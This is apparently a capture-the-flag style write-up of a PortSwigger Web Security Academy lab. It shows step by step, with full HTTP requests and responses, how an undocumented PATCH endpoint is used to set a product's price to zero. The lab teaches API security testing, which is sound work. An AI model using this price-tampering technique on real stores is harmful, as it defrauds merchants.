[Lab](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)

---

Firstly, I navigated on the website to let burp's Dashboard map the website while I'm navigating in

In **Target > Site Map**, I can see `/api/products/1/price`. I send it to the repeater and switch `GET` to `OPTIONS`
###### Request
```http
OPTIONS /api/products/1/price HTTP/2
Host: 0a64007c04c57d328010d053004a00a6.web-security-academy.net
Cookie: session=OdVtywJeFyEfXZKKERL6UfBuy7Q5fCkJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a64007c04c57d328010d053004a00a6.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

###### Response
```http
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

I can see that `GET` and `PATCH` are allowed so I try `PATCH`
###### Request
```http
PATCH /api/products/1/price HTTP/2
Host: 0a64007c04c57d328010d053004a00a6.web-security-academy.net
Cookie: session=OdVtywJeFyEfXZKKERL6UfBuy7Q5fCkJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a64007c04c57d328010d053004a00a6.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```
###### Response
I can see in the response
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93

{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
```

The error show I need to add the `Content-Type: application/json` to the request with an empty json
###### Request
```http
PATCH /api/products/1/price HTTP/2
Host: 0a64007c04c57d328010d053004a00a6.web-security-academy.net
Cookie: session=OdVtywJeFyEfXZKKERL6UfBuy7Q5fCkJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a64007c04c57d328010d053004a00a6.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Type: application/json

{}
```
###### Response
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 77

{"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
```

The error show me that I need to set the price in the json
###### Request
```http
PATCH /api/products/1/price HTTP/2
Host: 0a64007c04c57d328010d053004a00a6.web-security-academy.net
Cookie: session=OdVtywJeFyEfXZKKERL6UfBuy7Q5fCkJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a64007c04c57d328010d053004a00a6.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Type: application/json

{
	"price":0
}
```
###### Response
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}
```

The price has changed, I can buy my free jacket

